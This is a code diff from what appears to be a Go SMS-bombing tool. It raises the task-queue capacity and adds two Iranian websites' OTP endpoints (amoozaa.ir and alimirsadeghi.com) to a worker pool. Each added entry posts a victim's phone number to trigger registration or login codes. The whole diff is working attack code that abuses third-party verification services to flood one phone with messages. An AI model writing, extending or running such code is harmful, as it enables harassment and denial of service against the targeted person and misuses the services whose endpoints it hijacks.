@@ -466,11 +466,11 @@ cookieJar, _ := cookiejar.New(nil)
         Timeout: 10 * time.Second,
 	}
 
-	tasks := make(chan func(), repeatCount*145)
+	tasks := make(chan func(), repeatCount*150)
 
 	var wg sync.WaitGroup
 
-	ch := make(chan int, repeatCount*145)
+	ch := make(chan int, repeatCount*150)
 
 	for i := 0; i < numWorkers; i++ {
 		go func() {
@@ -487,6 +487,26 @@ cookieJar, _ := cookiejar.New(nil)
 
 
 
+// --- amoozaa.ir ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("username", phone)
+        sendFormRequest(c, ctx, "https://www.amoozaa.ir/send-register-code", formData, &wg, ch)
+    }
+}(client)
+
+// --- alimirsadeghi.com ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("action", "send_login_otp")
+        formData.Set("phone", phone)
+        sendFormRequest(c, ctx, "https://alimirsadeghi.com/n-ajax", formData, &wg, ch)
+    }
+}(client)
 // --- agahclinic.com (Form) ✅
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
